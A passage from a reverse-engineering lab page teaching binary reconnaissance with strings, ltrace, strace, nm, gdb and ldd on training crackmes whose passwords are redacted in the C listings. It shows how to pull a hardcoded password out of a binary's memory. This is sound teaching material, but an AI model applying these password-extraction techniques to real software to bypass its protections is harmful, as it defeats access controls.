Required</a></li><li><a href=http://netwinder.osuosl.org/users/p/patb/public_html/elf_relocs.html>Study Of ELF Loading and Relocs</a></li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-bf017b945edf284f9f46e861e257741f>5 -</h1><h1 id=exploration-tools>Exploration Tools</h1><details open><summary>Table of contents</summary><ul><li><a href=#tutorials>Tutorials</a><ul><li><a href=#01-tutorial---poor-mans-technique-strings>01. Tutorial - Poor man&rsquo;s technique: strings</a></li><li><a href=#02-tutorial---execution-tracing-ltrace-and-strace>02. Tutorial - Execution tracing (ltrace and strace)</a></li><li><a href=#03-tutorial---symbols-nm>03. Tutorial - Symbols: nm</a></li><li><a href=#04-tutorial---library-dependencies>04. Tutorial - Library dependencies</a></li><li><a href=#05-tutorial---network-netstat-and-netcat>05. Tutorial - Network: netstat and netcat</a></li><li><a href=#06-tutorial---open-files>06. Tutorial - Open files</a></li></ul></li><li><a href=#challenges>Challenges</a><ul><li><a href=#07-challenge---perfect-answer>07. Challenge - Perfect Answer</a></li><li><a href=#08-challenge---lots-of-strings>08. Challenge - Lots of strings</a></li><li><a href=#09-challenge---sleepy-cats>09. Challenge - Sleepy cats</a></li><li><a href=#10-challenge---hidden>10. Challenge - Hidden</a></li><li><a href=#11-challenge---detective>11. Challenge - Detective</a></li><li><a href=#extra>Extra</a></li><li><a href=#further-pwning>Further pwning</a></li></ul></li><li><a href=#further-reading>Further Reading</a></li></ul></details><h2 id=tutorials>Tutorials</h2><p>When faced with a binary with no source or parts of the source missing you can infer some of its functionalities based upon some basic reconnaissance techniques using various tools.</p><h3 id=01-tutorial---poor-mans-technique-strings>01. Tutorial - Poor man&rsquo;s technique: strings</h3><p>The simplest recon technique is to dump the ASCII (or Unicode) text from a binary. It doesn&rsquo;t offer any guarantees but sometimes you can get a lot of useful information out of it.</p><blockquote><p>By default, when applied to a binary it only scans the data section. To obtain information such as the compiler version used in producing the binary use:</p></blockquote><pre tabindex=0><code>strings -a crackme1
</code></pre><p>Let&rsquo;s illustrate how strings can be useful in a simple context. Try out the <a href=./activities/01-tutorial-strings/src>crackme1</a> binary:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdlib.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;string.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>my_strcmp</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#ce5c00;font-weight:700>*</span><span style=color:#000>s1</span><span style=color:#000;font-weight:700>,</span> <span style=color:#204a87;font-weight:700>char</span> <span style=color:#ce5c00;font-weight:700>*</span><span style=color:#000>s2</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#000>size_t</span> <span style=color:#000>i</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>len</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>strlen</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>s1</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>len</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>		<span style=color:#204a87;font-weight:700>return</span> <span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>for</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>i</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span> <span style=color:#000>i</span> <span style=color:#ce5c00;font-weight:700>&lt;</span> <span style=color:#000>len</span><span style=color:#000;font-weight:700>;</span> <span style=color:#000>i</span><span style=color:#ce5c00;font-weight:700>++</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>		<span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>s1</span><span style=color:#000;font-weight:700>[</span><span style=color:#000>i</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>!=</span> <span style=color:#000>s2</span><span style=color:#000;font-weight:700>[</span><span style=color:#000>i</span><span style=color:#000;font-weight:700>])</span>
</span></span><span style=display:flex><span>			<span style=color:#204a87;font-weight:700>return</span> <span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>1000</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Password:</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>fgets</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>buf</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1000</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>stdin</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#204a87>NULL</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>		<span style=color:#000>exit</span><span style=color:#000;font-weight:700>(</span><span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#000>buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#000>strlen</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>buf</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>-</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#39;\0&#39;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#ce5c00;font-weight:700>!</span><span style=color:#000>my_strcmp</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>buf</span><span style=color:#000;font-weight:700>,</span> <span style=color:#ce5c00;font-weight:700>???????????????????????</span><span style=color:#000;font-weight:700>))</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>		<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Correct!</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#000;font-weight:700>}</span> <span style=color:#204a87;font-weight:700>else</span>
</span></span><span style=display:flex><span>		<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Nope!</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>The password has been redacted from the listing but you can retrieve it with <code>strings</code>. Try it out!</p><h3 id=02-tutorial---execution-tracing-ltrace-and-strace>02. Tutorial - Execution tracing (ltrace and strace)</h3><p><a href=https://man7.org/linux/man-pages/man1/ltrace.1.html>ltrace</a> is an utility that can list library function calls or <a href=https://man7.org/linux/man-pages/man2/syscalls.2.html>syscalls</a> made by a program. <a href=https://man7.org/linux/man-pages/man1/strace.1.html>strace</a> is similar, but only lists syscalls. A syscall is a service exposed by the kernel itself.</p><p>The way they work is with the aid of a special syscall, called <a href=https://man7.org/linux/man-pages/man2/ptrace.2.html>ptrace</a>. This single syscall forms the basis for most of the functionality provided by <code>ltrace</code>, <code>strace</code>, <code>gdb</code> and similar tools that debug programs. It can receive up to 4 arguments: the operation, the PID to act on, the address to read/write and the data to write. The functionality exposed by <code>ptrace()</code> is massive, but think of any functionality you&rsquo;ve seen in a debugger:</p><ul><li>attach/detach to/from a process</li><li>set breakpoints</li><li>continue a stopped program</li><li>read/write registers</li><li>act on signals</li><li>register syscalls</li></ul><p><code>strace</code> provides some pretty printing strictly concerning the syscalls of the traced process. However, <code>ltrace</code> provides further functionality and gathers information about all library calls. Here&rsquo;s how <code>ltrace</code> does its magic:</p><ul><li>it reads the tracee memory and parses it in order to find out about loaded symbols</li><li>it makes a copy of the binary code pertaining to a symbol using a <code>PTRACE_PEEKTEXT</code> directive of <code>ptrace()</code></li><li>it injects a breakpoint using a <code>PTRACE_POKETEXT</code> directive of <code>ptrace()</code></li><li>it listens for a <code>SIGTRAP</code> which will be generated when the breakpoint is hit</li><li>when the breakpoint is hit, ltrace can examine the stack of the tracee and print information such as function name, parameters, return codes, etc.</li></ul><p>Let&rsquo;s try the next <code>crackme</code>. If we remove <code>my_strcmp</code> from the previous crackme you can solve it even without <code>strings</code> because <code>strcmp</code> is called from <code>libc.so</code>. You can use <code>ltrace</code> and see what functions are used and check for their given parameters. Try it out on the second <code>crackme</code> where <code>strings</code> does not help (<a href=./activities/02-tutorial-execution-tracing/src>crackme2</a>):</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdlib.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;string.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>correct_pass</span><span style=color:#000;font-weight:700>[]</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#ce5c00;font-weight:700>?????????????????</span> <span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#ce5c00;font-weight:700>*</span><span style=color:#000>deobf</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#ce5c00;font-weight:700>*</span><span style=color:#000>s</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#ce5c00;font-weight:700>???????????????</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>1000</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Password:</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>fgets</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>buf</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1000</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>stdin</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#204a87>NULL</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>		<span style=color:#000>exit</span><span style=color:#000;font-weight:700>(</span><span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#000>buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#000>strlen</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>buf</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>-</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#39;\0&#39;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#ce5c00;font-weight:700>!</span><span style=color:#000>strcmp</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>buf</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>deobf</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>correct_pass</span><span style=color:#000;font-weight:700>)))</span>
</span></span><span style=display:flex><span>		<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Correct!</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>else</span>
</span></span><span style=display:flex><span>		<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Nope!</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><h3 id=03-tutorial---symbols-nm>03. Tutorial - Symbols: nm</h3><p>Symbols are basically tags/labels, either for functions or for variables. If you enable debugging symbols you will get information on all the variables defined but normally symbols are only defined for functions and global variables. When stripping binaries even these can be deleted without any effect on the binary behavior. Dynamic symbols, however, have to remain so that the linker knows what functions to import:</p><pre tabindex=0><code>$ file xy
xy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.16, not stripped
$ nm xy
0804a020 B __bss_start
0804a018 D __data_start
0804a018 W data_start
0804a01c D __dso_handle
08049f0c d _DYNAMIC
0804a020 D _edata
0804a024 B _end
080484e4 T _fini
080484f8 R _fp_hw
0804a000 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
080482d4 T _init
08049f04 t __init_array_end
08049f00 t __init_array_start
080484fc R _IO_stdin_used
         w _ITM_deregisterTMCloneTable
         w _ITM_registerTMCloneTable
         w _Jv_RegisterClasses
080484e0 T __libc_csu_fini
08048470 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
0804843c T main
         U puts@@GLIBC_2.0
08048340 T _start
0804a020 D __TMC_END__
08048370 T __x86.get_pc_thunk.bx
$ strip xy
$ nm xy
nm: xy: no symbols
$ nm -D xy
         w __gmon_start__
080484fc R _IO_stdin_used
         U __libc_start_main
         U puts
</code></pre><p>Let&rsquo;s take a look at another crackme that combines crackme1 and crackme2. What would you do if you couldn&rsquo;t use neither strings nor ltrace to get anything useful?</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdlib.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;string.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>correct_pass</span><span style=color:#000;font-weight:700>[]</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#ce5c00;font-weight:700>????????????????????????</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>my_strcmp</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#ce5c00;font-weight:700>*</span><span style=color:#000>s1</span><span style=color:#000;font-weight:700>,</span> <span style=color:#204a87;font-weight:700>char</span> <span style=color:#ce5c00;font-weight:700>*</span><span style=color:#000>s2</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#000>size_t</span> <span style=color:#000>i</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>len</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>strlen</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>s1</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>len</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>		<span style=color:#204a87;font-weight:700>return</span> <span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>for</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>i</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span> <span style=color:#000>i</span> <span style=color:#ce5c00;font-weight:700>&lt;</span> <span style=color:#000>len</span><span style=color:#000;font-weight:700>;</span> <span style=color:#000>i</span><span style=color:#ce5c00;font-weight:700>++</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>		<span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>s1</span><span style=color:#000;font-weight:700>[</span><span style=color:#000>i</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>!=</span> <span style=color:#000>s2</span><span style=color:#000;font-weight:700>[</span><span style=color:#000>i</span><span style=color:#000;font-weight:700>])</span>
</span></span><span style=display:flex><span>			<span style=color:#204a87;font-weight:700>return</span> <span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#ce5c00;font-weight:700>*</span><span style=color:#000>deobf</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#ce5c00;font-weight:700>*</span><span style=color:#000>s</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span><span style=color:#ce5c00;font-weight:700>???????????????????????????</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>()</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>1000</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span>	<span style=color:#000>deobf</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>correct_pass</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Password:</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>fgets</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>buf</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1000</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>stdin</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#204a87>NULL</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>		<span style=color:#000>exit</span><span style=color:#000;font-weight:700>(</span><span style=color:#ce5c00;font-weight:700>-</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#000>buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#000>strlen</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>buf</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>-</span> <span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#39;\0&#39;</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#ce5c00;font-weight:700>!</span><span style=color:#000>my_strcmp</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>buf</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>correct_pass</span><span style=color:#000;font-weight:700>))</span> <span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>		<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Correct!</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#000;font-weight:700>}</span> <span style=color:#204a87;font-weight:700>else</span>
</span></span><span style=display:flex><span>		<span style=color:#000>printf</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Nope!</span><span style=color:#4e9a06>\n</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>In <a href=./activities/03-tutorial-symbols/src>crackme3</a>, deobfuscation is done before the password is read. Since the <code>correct_pass</code> has an associated symbol that is stored at a known location you can obtain the address and peer into it at runtime:</p><pre tabindex=0><code>$ nm crackme3 | grep pass
0804a02c D correct_pass
$ gdb -n ./crackme3
Reading symbols from ./crackme3...(no debugging symbols found)...done.
(gdb) run
Password:
^C
Program received signal SIGINT, Interrupt.
0xf7fdb430 in __kernel_vsyscall ()
(gdb) x/s 0x0804a02c
0x804a02c &lt;correct_pass&gt;:    &#34;JWxb7gE2pjiY3gRG8U&#34;
</code></pre><p>The above <code>x/s 0x0804a02c</code> command in GDB is used for printing the string starting from address <code>0x0804a02c</code>. <code>x</code> stands for examine memory and <code>s</code> stands for string format. In short it dumps memory in string format starting from the address passed as argument. You may print multiple strings by prefixing <code>s</code> with a number, for example <code>x/20s 0x0804a02c</code>.</p><p>For other programs (that are not stripped) you can even get a hint as to what they do using solely <code>nm</code>:</p><pre tabindex=0><code>$ nm mystery_binary
.....
0000000000402bef T drop_privs(char const*)
00000000004027db T IndexHandler(std::string const&amp;, HttpRequest const&amp;, HttpResponse*)
0000000000402ad8 T StatusHandler(std::string const&amp;, HttpRequest const&amp;, HttpResponse*)
000000000040237f T NotFoundHandler(std::string const&amp;, HttpRequest const&amp;, HttpResponse*)
00000000004024a1 T BadRequestHandler(std::string const&amp;, HttpRequest const&amp;, HttpResponse*)
00000000004025c3 T MaybeAddCORSHeader(std::string const&amp;, HttpRequest const&amp;, HttpResponse*)
0000000000402f52 t __static_initialization_and_destruction_0(int, int)
0000000000402cf8 T handle(int)
00000000004020fc T recvlen(int, char*, unsigned long)
0000000000402195 T sendlen(int, char const*, unsigned long)
0000000000402224 T sendstr(int, char const*)
0000000000402255 T urldecode(std::string const&amp;)
.....
</code></pre><p><strong>Note:</strong> In this case the signatures are also decoded because the binary was compiled from C++ source code.</p><p>Dealing with stripped binaries (or worse, statically linked binaries that have been stripped) is harder but can still be done. We&rsquo;ll see how in a future lab.</p><h3 id=04-tutorial---library-dependencies>04. Tutorial - Library dependencies</h3><p>Most programs you will see make use of existing functionality. You don&rsquo;t want to always reimplement string functions or file functions. Therefore, most programs use dynamic libraries. These shared objects, as they are called alternatively, allow you to have a smaller program and also allow multiple programs to use a single copy of the code within the library. But how does that actually work?</p><p>What makes all of these programs work is the Linux dynamic linker/loader. This is a statically linked helper program that resolves symbol names from shared objects at runtime. We can use the dynamic linker to gather information about an executable.</p><p>The first and most common thing to do is see what libraries the executable loads, with the <a href=https://man7.org/linux/man-pages/man1/ldd.1.html>ldd</a> utility:</p><pre tabindex=0><code>$ ldd /bin/ls
    linux-vdso.so.1 (0x00007ffff13fe000)
    librt.so.1 =&gt; /lib64/librt.so.1 (0x00007fc9b4893000)
    libacl.so.1 =&gt; /lib64/libacl.so.1 (0x00007fc9b468a000)
    libc.so.6 =&gt; /lib64/libc.so.6 (0x00007fc9b42da000)
    libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007fc9b40bd000)
    libattr.so.1 =&gt; /lib64/libattr.so.1 (0x00007fc9b3eb8000)
    /lib64/ld-linux-x86-64.so.2 (0x00007fc9b4a9b000)
</code></pre><p>We see that for each dependency in the executable, <code>ldd</code> lists where it is found on the filesystem and where it is loaded in the process memory space. Alternatively, you can achieve the same result with the <code>LD_TRACE_LOADED_OBJECTS</code> environment variable, or with the dynamic loader itself:</p><pre tabindex=0><code>$ LD_TRACE_LOADED_OBJECTS=whatever /bin/ls
    linux-vdso.so.1 (0x00007fff325fe000)
    librt.so.1 =&gt; /lib64/librt.so.1 (0x00007f1845386000)
    libacl.so.1 =&gt; /lib64/libacl.so.1 (0x00007f184517d000)
    libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f1844dcd000)
    libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007f1844bb0000)
    libattr.so.1 =&gt; /lib64/libattr.so.1 (0x00007f18449ab000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f184558e000)
$ /lib/ld-linux-x86-64.so.2 --list /bin/ls
    linux-vdso.so.1 (0x00007fff1e712000)
    librt.so.1 =&gt; /lib64/librt.so.1 (0x00007f18a07d8000)
